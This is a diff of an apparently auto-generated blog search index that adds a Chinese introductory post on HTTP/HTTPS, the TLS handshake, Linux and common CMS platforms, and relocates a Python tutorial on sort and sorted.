@@ -259,6 +259,68 @@
       </categories>
   </entry>
   <entry>
+    <title>WEB入门</title>
+    <url>/2022/02/10/WEB%E5%85%A5%E9%97%A8/</url>
+    <content><![CDATA[<h1 id="WEB入门"><a href="#WEB入门" class="headerlink" title="WEB入门"></a>WEB入门</h1><p>最近感觉基础薄弱，遂重新温习一下各类基础</p>
+<h1 id="1-WEB技术架构"><a href="#1-WEB技术架构" class="headerlink" title="1. WEB技术架构"></a>1. WEB技术架构</h1><p><img src="/2022/02/10/WEB%E5%85%A5%E9%97%A8/image-20220210105848463.png" alt="image-20220210105848463"></p>
+<h2 id="1-1-协议"><a href="#1-1-协议" class="headerlink" title="1.1 协议"></a>1.1 协议</h2><h3 id="1-1-1-http协议"><a href="#1-1-1-http协议" class="headerlink" title="1.1.1 http协议"></a>1.1.1 http协议</h3><h4 id="1-1-1-1-http简介"><a href="#1-1-1-1-http简介" class="headerlink" title="1.1.1.1 http简介"></a>1.1.1.1 http简介</h4><p>超文本传输协议（英文：<strong>H</strong>yper<strong>T</strong>ext <strong>T</strong>ransfer <strong>P</strong>rotocol，缩写：HTTP）是一种用于分布式、协作式和超媒体信息系统的应用层协议。HTTP是万维网的数据通信的基础。</p>
+<h4 id="1-1-1-2-http概述"><a href="#1-1-1-2-http概述" class="headerlink" title="1.1.1.2 http概述"></a>1.1.1.2 http概述</h4><p>HTTP是一个客户端终端（用户）和服务器端（网站）请求和应答的标准（TCP）。通过使用网页浏览器、网络爬虫或者其它的工具，客户端发起一个HTTP请求到服务器上指定端口（默认端口为80）。我们称这个客户端为用户代理程序（user agent）。应答的服务器上存储着一些资源，比如HTML文件和图像。我们称这个应答服务器为源服务器（origin server）。在用户代理和源服务器中间可能存在多个“中间层”，比如代理服务器、网关或者隧道（tunnel）。</p>
+<p>尽管TCP/IP协议是互联网上最流行的应用，HTTP协议中，并没有规定必须使用它或它支持的层。事实上，HTTP可以在任何互联网协议上，或其他网络上实现。HTTP假定其下层协议提供可靠的传输。因此，任何能够提供这种保证的协议都可以被其使用。因此也就是其在TCP/IP协议族使用TCP作为其传输层。</p>
+<p>通常，由HTTP客户端发起一个请求，创建一个到服务器指定端口（默认是80端口）的TCP连接。HTTP服务器则在那个端口监听客户端的请求。一旦收到请求，服务器会向客户端返回一个状态，比如”HTTP/1.1 200 OK”，以及返回的内容，如请求的文件、错误消息、或者其它信息。</p>
+<h4 id="1-1-1-3-http工作原理"><a href="#1-1-1-3-http工作原理" class="headerlink" title="1.1.1.3 http工作原理"></a>1.1.1.3 http工作原理</h4><p>HTTP协议定义Web客户端如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端。HTTP协议采用了请求/响应模型。客户端向服务器发送一个请求报文，请求报文包含请求的方法、URL、协议版本、请求头部和请求数据。服务器以一个状态行作为响应，响应的内容包括协议的版本、成功或者错误代码、服务器信息、响应头部和响应数据。</p>
+<p>以下是 HTTP 请求/响应的步骤：</p>
+<p>\1. 客户端连接到Web服务器<br>一个HTTP客户端，通常是浏览器，与Web服务器的HTTP端口（默认为80）建立一个TCP套接字连接。例如，<a href="http://www.baidu.com/">http://www.baidu.com</a>。</p>
+<p>\2. 发送HTTP请求<br>通过TCP套接字，客户端向Web服务器发送一个文本的请求报文，一个请求报文由请求行、请求头部、空行和请求数据4部分组成。</p>
+<p>\3. 服务器接受请求并返回HTTP响应<br>Web服务器解析请求，定位请求资源。服务器将资源复本写到TCP套接字，由客户端读取。一个响应由状态行、响应头部、空行和响应数据4部分组成。</p>
+<p>\4. 释放连接TCP连接<br>若connection 模式为close，则服务器主动关闭TCP连接，客户端被动关闭连接，释放TCP连接;若connection 模式为keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求;</p>
+<p>\5. 客户端浏览器解析HTML内容<br>客户端浏览器首先解析状态行，查看表明请求是否成功的状态代码。然后解析每一个响应头，响应头告知以下为若干字节的HTML文档和文档的字符集。客户端浏览器读取响应数据HTML，根据HTML的语法对其进行格式化，并在浏览器窗口中显示。</p>
+<h4 id="1-1-1-4-HTTP状态码"><a href="#1-1-1-4-HTTP状态码" class="headerlink" title="1.1.1.4 HTTP状态码"></a>1.1.1.4 HTTP状态码</h4><p><img src="/2022/02/10/WEB%E5%85%A5%E9%97%A8/877318-20180418161321986-304902913.png" alt="img"></p>
+<h4 id="1-1-1-5-url"><a href="#1-1-1-5-url" class="headerlink" title="1.1.1.5 url"></a>1.1.1.5 url</h4><p>超文本传输协议（HTTP）的统一资源定位符将从因特网获取信息的五个基本元素包括在一个简单的地址中：</p>
+<ul>
+<li>传送协议。</li>
+<li>层级URL标记符号(为[//],固定不变)</li>
+<li>访问资源需要的凭证信息（可省略）</li>
+<li>服务器。（通常为域名，有时为IP地址）</li>
+<li>端口号。（以数字方式表示，若为HTTP的默认值“:80”可省略）</li>
+<li>路径。（以“/”字符区别路径中的每一个目录名称）</li>
+<li>查询。（GET模式的窗体参数，以“?”字符为起点，每个参数以“&amp;”隔开，再以“=”分开参数名称与数据，通常以UTF8的URL编码，避开字符冲突的问题）</li>
+<li>片段。以“#”字符为起点</li>
+</ul>
+<p>以<a href="http://www.luffycity.com/news/index.html?id=250&amp;page=1">http://www.luffycity.com:80/news/index.html?id=250&amp;page=1</a> 为例</p>
+<h4 id="1-1-1-6-http响应格式"><a href="#1-1-1-6-http响应格式" class="headerlink" title="1.1.1.6 http响应格式"></a>1.1.1.6 http响应格式</h4><p><img src="/2022/02/10/WEB%E5%85%A5%E9%97%A8/867021-20180322001744323-654009411.jpg" alt="img"></p>
+<p><a href="https://www.cnblogs.com/an-wen/p/11180076.html">HTTP协议超级详解 - 爱文飞翔 - 博客园 (cnblogs.com)</a></p>
+<h3 id="1-1-2-https协议"><a href="#1-1-2-https协议" class="headerlink" title="1.1.2 https协议"></a>1.1.2 https协议</h3><p>基于HTTP协议，通过SSL或TLS提供加密处理数据、验证对方身份以及数据完整性保护</p>
+<p>通过抓包可以看到数据不是明文传输，而且HTTPS有如下特点：</p>
+<ol>
+<li>内容加密：采用混合加密技术，中间者无法直接查看明文内容</li>
+<li>验证身份：通过证书认证客户端访问的是自己的服务器</li>
+<li>保护数据完整性：防止传输的内容被中间人冒充或者篡改</li>
+</ol>
+<h4 id="1-1-2-1-ssl建立连接过程"><a href="#1-1-2-1-ssl建立连接过程" class="headerlink" title="1.1.2.1 ssl建立连接过程"></a>1.1.2.1 ssl建立连接过程</h4><p><img src="/2022/02/10/WEB%E5%85%A5%E9%97%A8/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW9taW5nMTAwMDAx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>client向server发送请求<a href="https://baidu.com,然后连接到server的443端口,发送的信息主要是随机值1和客户端支持的加密算法./">https://baidu.com，然后连接到server的443端口，发送的信息主要是随机值1和客户端支持的加密算法。</a><br>server接收到信息之后给予client响应握手信息，包括随机值2和匹配好的协商加密算法，这个加密算法一定是client发送给server加密算法的子集。<br>随即server给client发送第二个响应报文是数字证书。服务端必须要有一套数字证书，可以自己制作，也可以向组织申请。区别就是自己颁发的证书需要客户端验证通过，才可以继续访问，而使用受信任的公司申请的证书则不会弹出提示页面，这套证书其实就是一对公钥和私钥。传送证书，这个证书其实就是公钥，只是包含了很多信息，如证书的颁发机构，过期时间、服务端的公钥，第三方证书认证机构(CA)的签名，服务端的域名信息等内容。<br>客户端解析证书，这部分工作是由客户端的TLS来完成的，首先会验证公钥是否有效，比如颁发机构，过期时间等等，如果发现异常，则会弹出一个警告框，提示证书存在问题。如果证书没有问题，那么就生成一个随即值（预主秘钥）。<br>客户端认证证书通过之后，接下来是通过随机值1、随机值2和预主秘钥组装会话秘钥。然后通过证书的公钥加密会话秘钥。<br>传送加密信息，这部分传送的是用证书加密后的会话秘钥，目的就是让服务端使用秘钥解密得到随机值1、随机值2和预主秘钥。<br>服务端解密得到随机值1、随机值2和预主秘钥，然后组装会话秘钥，跟客户端会话秘钥相同。<br>客户端通过会话秘钥加密一条消息发送给服务端，主要验证服务端是否正常接受客户端加密的消息。<br>同样服务端也会通过会话秘钥加密一条消息回传给客户端，如果客户端能够正常接受的话表明SSL层连接建立完成了。</p>
+<p><a href="https://blog.csdn.net/xiaoming100001/article/details/81109617">(39条消息) HTTP和HTTPS协议，看一篇就够了_不一样的博客-CSDN博客_https</a></p>
+<h2 id="1-2-系统"><a href="#1-2-系统" class="headerlink" title="1.2 系统"></a>1.2 系统</h2><p>在这只是先了解基础，后面会继续深入学习操作系统方面的东西</p>
+<h3 id="1-2-1-Linux系统"><a href="#1-2-1-Linux系统" class="headerlink" title="1.2.1 Linux系统"></a>1.2.1 Linux系统</h3><p>Linux，全称GNU/Linux，是一种免费使用和自由传播的<a href="https://baike.baidu.com/item/%E7%B1%BBUNIX/9032872">类UNIX</a>操作系统，其内核由<a href="https://baike.baidu.com/item/%E6%9E%97%E7%BA%B3%E6%96%AF%C2%B7%E6%9C%AC%E7%BA%B3%E7%AC%AC%E5%85%8B%E7%89%B9%C2%B7%E6%89%98%E7%93%A6%E5%85%B9/1034429">林纳斯·本纳第克特·托瓦兹</a>于1991年10月5日首次发布，它主要受到<a href="https://baike.baidu.com/item/Minix/7106045">Minix</a>和Unix思想的启发，是一个基于<a href="https://baike.baidu.com/item/POSIX">POSIX</a>的多用户、<a href="https://baike.baidu.com/item/%E5%A4%9A%E4%BB%BB%E5%8A%A1/1011764">多任务</a>、支持<a href="https://baike.baidu.com/item/%E5%A4%9A%E7%BA%BF%E7%A8%8B/1190404">多线程</a>和多<a href="https://baike.baidu.com/item/CPU">CPU</a>的操作系统。它能运行主要的<a href="https://baike.baidu.com/item/Unix/219943">Unix</a>工具软件、应用程序和网络协议。它支持<a href="https://baike.baidu.com/item/32%E4%BD%8D/5812218">32位</a>和<a href="https://baike.baidu.com/item/64%E4%BD%8D">64位</a>硬件。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。Linux有上百种不同的发行版，如基于社区开发的<a href="https://baike.baidu.com/item/debian/748667">debian</a>、<a href="https://baike.baidu.com/item/archlinux/10857530">archlinux</a>，和基于商业开发的[Red Hat Enterprise Linux](<a href="https://baike.baidu.com/item/Red">https://baike.baidu.com/item/Red</a> Hat Enterprise Linux/10770503)、<a href="https://baike.baidu.com/item/SUSE/60409">SUSE</a>、[Oracle Linux](<a href="https://baike.baidu.com/item/Oracle">https://baike.baidu.com/item/Oracle</a> Linux/6876458)等。</p>
+<h3 id="1-2-2-Unix系统"><a href="#1-2-2-Unix系统" class="headerlink" title="1.2.2 Unix系统"></a>1.2.2 Unix系统</h3><p>Unix是20世纪70年代初出现的一个操作系统，除了作为网络操作系统之外，还可以作为单机操作系统使用。Unix作为一种开发平台和台式操作系统获得了广泛使用，主要用于工程应用和科学计算等领域。</p>
+<h2 id="1-3-前端"><a href="#1-3-前端" class="headerlink" title="1.3 前端"></a>1.3 前端</h2><p><img src="/2022/02/10/WEB%E5%85%A5%E9%97%A8/v2-bd43cb8bd3dc72bb0df8de108d4de2e0_r.jpg" alt="preview"></p>
+<p>了解 web的大概框架，具体某个地方的东西会更深入的学习。</p>
+<h2 id="1-4-后端"><a href="#1-4-后端" class="headerlink" title="1.4 后端"></a>1.4 后端</h2><h2 id="1-5-中间件"><a href="#1-5-中间件" class="headerlink" title="1.5 中间件"></a>1.5 中间件</h2><h2 id="1-6-数据库"><a href="#1-6-数据库" class="headerlink" title="1.6 数据库"></a>1.6 数据库</h2><h1 id="2-web网站平台"><a href="#2-web网站平台" class="headerlink" title="2. web网站平台"></a>2. web网站平台</h1><p>内容管理系统（content management system，CMS），是一种位于WEB前端（Web 服务器）和后端办公系统或流程（内容创作、编辑）之间的软件系统。内容的创作人员、编辑人员、发布人员使用内容管理系统来提交、修改、审批、发布内容。这里指的“内容”可能包括文件、表格、图片、数据库中的数据甚至视频等一切你想要发布到Internet、Intranet以及Extranet网站的信息。<br>内容管理还可选地提供内容抓取工具，将第三方信息来源，比如将文本文件、HTML网页、Web服务、关系数据库等的内容自动抓取，并经分析处理后放到自身的内容库中。<br>随着个性化的发展，内容管理还辅助WEB前端将内容以个性化的方式提供给内容使用者，即提供个性化的门户框架，以基于WEB技术将内容更好地推送到用户的浏览器端.<br>内容管理系统是企业信息化建设和电子政务的新宠，也是一个相对较新的市场。对于内容管理，业界还没有一个统一的定义，不同的机构有不同的理解。</p>
+<h2 id="2-1-wordpress"><a href="#2-1-wordpress" class="headerlink" title="2.1 wordpress"></a>2.1 wordpress</h2><p><strong>WordPress是使用PHP语言开发的<a href="https://www.zhihu.com/search?q=%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1793643716%7D">内容管理系统</a>：</strong></p>
+<ul>
+<li>内容管理系统，英文叫做 Content Management System（CMS）。</li>
+<li>WordPress是全球最多人使用的，免费开源的<a href="https://www.zhihu.com/search?q=%E5%BB%BA%E7%AB%99%E7%A8%8B%E5%BA%8F&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1793643716%7D">建站程序</a>。</li>
+</ul>
+<h2 id="2-2-joomla"><a href="#2-2-joomla" class="headerlink" title="2.2 joomla"></a>2.2 joomla</h2><p>Joomla!是一套全球知名的内容管理系统。Joomla!是使用PHP语言加上MySQL数据库所开发的软件系统，最新版本是3.9.27 。可以在Linux、 Windows、MacOSX等各种不同的平台上执行。</p>
+<h2 id="2-3-discuz"><a href="#2-3-discuz" class="headerlink" title="2.3 discuz!"></a>2.3 discuz!</h2><p>Crossday Discuz! Board（简称 Discuz!）是北京康盛新创科技有限责任公司推出的一套通用的社区论坛软件系统。自2001年6月面世以来，Discuz!已拥有15年以上的应用历史和200多万网站用户案例，是全球成熟度最高、覆盖率最大的论坛软件系统之一。</p>
+<h2 id="2-4-dedecms（织梦）"><a href="#2-4-dedecms（织梦）" class="headerlink" title="2.4 dedecms（织梦）"></a>2.4 dedecms（织梦）</h2><p>织梦内容管理系统(DedeCms) 以简单、实用、开源而闻名，是国内最知名的PHP开源网站管理系统，也是使用用户最多的PHP类CMS系统，在经历多年的发展，版本无论在功能，还是在易用性方面，都有了长足的发展和进步，DedeCms免费版的主要目标用户锁定在个人站长，功能更专注于个人网站或中小型门户的构建，当然也不乏有企业用户和学校等在使用该系统。</p>
+<h2 id="2-5-wamp"><a href="#2-5-wamp" class="headerlink" title="2.5 wamp"></a>2.5 wamp</h2><p>Windows下的Apache+Mysql/MariaDB+Perl/PHP/Python，一组常用来搭建动态网站或者服务器的开源软件，本身都是各自独立的程序，但是因为常被放在一起使用，拥有了越来越高的兼容度，共同组成了一个强大的Web应用程序平台。随着开源潮流的蓬勃发展，开放源代码的LAMP已经与J2EE和.Net商业软件形成三足鼎立之势，并且该软件开发的项目在软件方面的投资成本较低，因此受到整个IT界的关注。LAMP是基于Linux，Apache，MySQL/MariaDB和PHP的开放资源网络开发平台，PHP是一种有时候用Perl或Python可代替的编程语言。这个术语来自欧洲，在那里这些程序常用来作为一种标准开发环境。名字来源于每个程序的第一个字母。每个程序在所有权里都符合开放源代码标准：Linux是开放系统；Apache是最通用的网络服务器；mySQL是带有基于网络管理附加工具的关系数据库；PHP是流行的对象脚本语言，它包含了多数其它语言的优秀特征来使得它的网络开发更加有效。开发者在Windows操作系统下使用这些Linux环境里的工具称为使用WAMP。</p>
+<p>s</p>
+]]></content>
+      <categories>
+        <category>-basic</category>
+      </categories>
+  </entry>
+  <entry>
     <title>bugku login1解题心得（sql约束攻击）</title>
     <url>/2021/12/27/bugku-login1%E8%A7%A3%E9%A2%98%E5%BF%83%E5%BE%97%EF%BC%88sql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB%EF%BC%89/</url>
     <content><![CDATA[<p>bugku login1解题心得（sql约束攻击）</p>
@@ -1301,6 +1363,58 @@
       </categories>
   </entry>
   <entry>
+    <title>一、拓展py：方法和函数拓展 sort sorted</title>
+    <url>/2022/01/05/%E4%B8%80%E3%80%81%E6%8B%93%E5%B1%95py%EF%BC%9A%E6%96%B9%E6%B3%95%E5%92%8C%E5%87%BD%E6%95%B0%E6%8B%93%E5%B1%95-sort-sorted/</url>
+    <content><![CDATA[<h1 id="python方法和函数拓展-sort-sorted"><a href="#python方法和函数拓展-sort-sorted" class="headerlink" title="python方法和函数拓展 sort sorted"></a>python方法和函数拓展 sort sorted</h1><h2 id="1-sort-与-sorted的区别"><a href="#1-sort-与-sorted的区别" class="headerlink" title="1.sort 与 sorted的区别"></a>1.sort 与 sorted的区别</h2><p>sort是对列表本身进行永久性的排序。</p>
+<p>sorted则会返回一个排序之后的列表，不会对列表本身进行修改。</p>
+<p>sort 是应用在 list 上的方法，sorted 可以对所有可迭代的对象进行排序操作。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line"><span class="built_in">list</span>.sort()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)<span class="comment">#[1, 2, 3]</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">new_list = <span class="built_in">sorted</span>(<span class="built_in">list</span>)</span><br><span class="line"><span class="built_in">print</span>(new_list)<span class="comment">#[1, 2, 3]</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="2-sort"><a href="#2-sort" class="headerlink" title="2.sort"></a>2.sort</h2><h3 id="2-1参数"><a href="#2-1参数" class="headerlink" title="2.1参数"></a>2.1参数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span>.sort(cmp=<span class="literal">None</span>, key=<span class="literal">None</span>, reverse=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>cmp – 可选参数, 如果指定了该参数会使用该参数的方法进行排序。</li>
+<li>key – 主要是用来进行比较的元素，只有一个参数，具体的函数的参数就是取自于可迭代对象中，指定可迭代对象中的一个元素来进行排序。</li>
+<li>reverse – 排序规则，<strong>reverse = True</strong> 降序， <strong>reverse = False</strong> 升序（默认）。</li>
+</ul>
+<h3 id="2-2key参数的应用"><a href="#2-2key参数的应用" class="headerlink" title="2.2key参数的应用"></a>2.2key参数的应用</h3><p>根据列表中指定的元素进行排序</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [[<span class="number">1</span>,<span class="number">3</span>],[<span class="number">12</span>,<span class="number">1</span>],[<span class="number">32</span>,<span class="number">2</span>]]</span><br><span class="line"><span class="comment">#定义一个取第二个元素的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">takesecond</span>(<span class="params">item</span>):</span></span><br><span class="line">    <span class="keyword">return</span> item[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#循环列表中的每一个元素，并且根据元素中的第二个元素进行排序。</span></span><br><span class="line"><span class="built_in">list</span>.sort(key=takesecond)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)<span class="comment">#[[12, 1], [32, 2], [1, 3]]</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [[<span class="number">1</span>,<span class="number">3</span>],[<span class="number">12</span>,<span class="number">1</span>],[<span class="number">32</span>,<span class="number">2</span>]]</span><br><span class="line"><span class="comment">#定义了一个匿名函数，参数x，返回x中的第二个元素</span></span><br><span class="line"><span class="comment">#key 指定了根据x的第二个元素进行排序</span></span><br><span class="line"><span class="built_in">list</span>.sort(key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)<span class="comment">#[[12, 1], [32, 2], [1, 3]]</span></span><br></pre></td></tr></table></figure>
+
+<p>key会把列表的元素作为参数传入后面的函数，然后把函数的返回值作为排序的依据。</p>
+<h4 id="2-2-1扩展"><a href="#2-2-1扩展" class="headerlink" title="2.2.1扩展"></a>2.2.1扩展</h4><p>如果key接受了两个返回值，那么第一个返回值就会是首要排序依据，如果第一个返回值相等，那么会根据第二个返回值进行排序。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [[<span class="number">1</span>,<span class="number">3</span>],[<span class="number">12</span>,<span class="number">1</span>],[<span class="number">32</span>,<span class="number">2</span>],[<span class="number">31</span>,<span class="number">2</span>]]</span><br><span class="line"><span class="comment">#定义了一个匿名函数，返回第一个元素和第二个元素</span></span><br><span class="line"><span class="comment">#key就会让x[1]成为首要排序依据，另一个成为次要依据</span></span><br><span class="line"><span class="built_in">list</span>.sort(key=<span class="keyword">lambda</span> x:(x[<span class="number">1</span>],x[<span class="number">0</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)<span class="comment">#[[12, 1], [31, 2], [32, 2], [1, 3]]</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-3reverse参数的应用"><a href="#2-3reverse参数的应用" class="headerlink" title="2.3reverse参数的应用"></a>2.3reverse参数的应用</h3><p><strong>reverse = True</strong> 降序， <strong>reverse = False</strong> 升序（默认）。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [[<span class="number">1</span>,<span class="number">3</span>],[<span class="number">12</span>,<span class="number">1</span>],[<span class="number">32</span>,<span class="number">2</span>],[<span class="number">31</span>,<span class="number">2</span>]]</span><br><span class="line"><span class="comment">#设置为降序，从大到小。</span></span><br><span class="line"><span class="built_in">list</span>.sort(key=<span class="keyword">lambda</span> x:(x[<span class="number">1</span>],x[<span class="number">0</span>]),reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)<span class="comment">#[[1, 3], [32, 2], [31, 2], [12, 1]]</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="3-sorted"><a href="#3-sorted" class="headerlink" title="3.sorted"></a>3.sorted</h2><h3 id="3-1参数"><a href="#3-1参数" class="headerlink" title="3.1参数"></a>3.1参数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sorted</span>(iterable, cmp=<span class="literal">None</span>, key=<span class="literal">None</span>, reverse=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>iterable – 可迭代对象。</li>
+<li>cmp – 比较的函数，这个具有两个参数，参数的值都是从可迭代对象中取出，此函数必须遵守的规则为，大于则返回1，小于则返回-1，等于则返回0。</li>
+<li>key – 主要是用来进行比较的元素，只有一个参数，具体的函数的参数就是取自于可迭代对象中，指定可迭代对象中的一个元素来进行排序。</li>
+<li>reverse – 排序规则，reverse = True 降序 ， reverse = False 升序（默认）。</li>
+</ul>
+<h3 id="3-2对key参数的应用"><a href="#3-2对key参数的应用" class="headerlink" title="3.2对key参数的应用"></a>3.2对key参数的应用</h3><p>按value值对字典排序</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = &#123;<span class="string">&quot;a&quot;</span>:<span class="number">3</span>,<span class="string">&quot;b&quot;</span>:<span class="number">1</span>,<span class="string">&quot;c&quot;</span>:<span class="number">2</span>&#125;</span><br><span class="line"><span class="comment">#指定迭代对象是字典中的每一个键值对</span></span><br><span class="line"><span class="comment">#将键值对作为参数传入匿名函数，返回值，将value作为排序的标准</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(d.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>]))</span><br><span class="line"><span class="comment">#[(&#x27;b&#x27;, 1), (&#x27;c&#x27;, 2), (&#x27;a&#x27;, 3)]</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3对cmp参数的使用（效率key-gt-cmp）"><a href="#3-3对cmp参数的使用（效率key-gt-cmp）" class="headerlink" title="3.3对cmp参数的使用（效率key&gt;cmp）"></a>3.3对cmp参数的使用（效率key&gt;cmp）</h3><p>发现在py3中取消了cmp参数，那就不写啦！</p>
+<h3 id="3-4reverse"><a href="#3-4reverse" class="headerlink" title="3.4reverse"></a>3.4reverse</h3><p>和上面的一样的</p>
+<h2 id="4-应用扩展"><a href="#4-应用扩展" class="headerlink" title="4.应用扩展"></a>4.应用扩展</h2><p>输入名字（英文），名字在前面形式在后面中间用空格分离，要求根据姓氏排序，姓氏首字母一样就用名字排序，然后输出一个列表，每一个元素装一个名字。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">sName=<span class="built_in">input</span>(<span class="string">&quot;输入名字，名前后姓，quit退出&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;quit&quot;</span></span><br><span class="line">a=[]</span><br><span class="line"><span class="keyword">while</span> sName!=<span class="string">&quot;quit&quot;</span>:</span><br><span class="line">    a.append(sName)</span><br><span class="line">    sName=<span class="built_in">input</span>() <span class="keyword">or</span> <span class="string">&quot;quit&quot;</span></span><br><span class="line"><span class="comment"># 把名字和姓氏组成一个列表嵌套进一个列表中</span></span><br><span class="line">Allname=[x.split() <span class="keyword">for</span> x <span class="keyword">in</span> a]</span><br><span class="line"><span class="comment">#排序</span></span><br><span class="line">Allname.sort(key=<span class="keyword">lambda</span> x:(x[<span class="number">1</span>],x[<span class="number">0</span>]))</span><br><span class="line">final=[]</span><br><span class="line"><span class="comment">#把嵌套的列表转换回来</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Allname)):</span><br><span class="line">    final.append(<span class="string">&quot; &quot;</span>.join(y <span class="keyword">for</span> y <span class="keyword">in</span> Allname[x]))</span><br><span class="line"><span class="built_in">print</span>(final)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>-python</category>
+      </categories>
+  </entry>
+  <entry>
     <title>一，学习py：{} 布尔 del insert input int（）字符串为空的判断 elif</title>
     <url>/2021/12/28/%E4%B8%80%EF%BC%8C%E5%AD%A6%E4%B9%A0py%EF%BC%9A-%E5%B8%83%E5%B0%94-del-insert-input-int%EF%BC%88%EF%BC%89%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%BA%E7%A9%BA%E7%9A%84%E5%88%A4%E6%96%AD-elif/</url>
     <content><![CDATA[<p>一，学习py：{} 布尔 del insert input int（）字符串为空的判断 elif</p>
@@ -1522,58 +1636,6 @@
 
 <p>推导式的一个拓展（除去末尾的mp4）</p>
 <p><img src="/2022/01/03/%E4%B8%83%E3%80%81%E5%AD%A6%E4%B9%A0py%EF%BC%9A%E5%87%BD%E6%95%B0/image-20220103205854535.png" alt="image-20220103205854535"></p>
-]]></content>
-      <categories>
-        <category>-python</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>一、拓展py：方法和函数拓展 sort sorted</title>
-    <url>/2022/01/05/%E4%B8%80%E3%80%81%E6%8B%93%E5%B1%95py%EF%BC%9A%E6%96%B9%E6%B3%95%E5%92%8C%E5%87%BD%E6%95%B0%E6%8B%93%E5%B1%95-sort-sorted/</url>
-    <content><![CDATA[<h1 id="python方法和函数拓展-sort-sorted"><a href="#python方法和函数拓展-sort-sorted" class="headerlink" title="python方法和函数拓展 sort sorted"></a>python方法和函数拓展 sort sorted</h1><h2 id="1-sort-与-sorted的区别"><a href="#1-sort-与-sorted的区别" class="headerlink" title="1.sort 与 sorted的区别"></a>1.sort 与 sorted的区别</h2><p>sort是对列表本身进行永久性的排序。</p>
-<p>sorted则会返回一个排序之后的列表，不会对列表本身进行修改。</p>
-<p>sort 是应用在 list 上的方法，sorted 可以对所有可迭代的对象进行排序操作。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line"><span class="built_in">list</span>.sort()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)<span class="comment">#[1, 2, 3]</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">new_list = <span class="built_in">sorted</span>(<span class="built_in">list</span>)</span><br><span class="line"><span class="built_in">print</span>(new_list)<span class="comment">#[1, 2, 3]</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="2-sort"><a href="#2-sort" class="headerlink" title="2.sort"></a>2.sort</h2><h3 id="2-1参数"><a href="#2-1参数" class="headerlink" title="2.1参数"></a>2.1参数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span>.sort(cmp=<span class="literal">None</span>, key=<span class="literal">None</span>, reverse=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>cmp – 可选参数, 如果指定了该参数会使用该参数的方法进行排序。</li>
-<li>key – 主要是用来进行比较的元素，只有一个参数，具体的函数的参数就是取自于可迭代对象中，指定可迭代对象中的一个元素来进行排序。</li>
-<li>reverse – 排序规则，<strong>reverse = True</strong> 降序， <strong>reverse = False</strong> 升序（默认）。</li>
-</ul>
-<h3 id="2-2key参数的应用"><a href="#2-2key参数的应用" class="headerlink" title="2.2key参数的应用"></a>2.2key参数的应用</h3><p>根据列表中指定的元素进行排序</p>
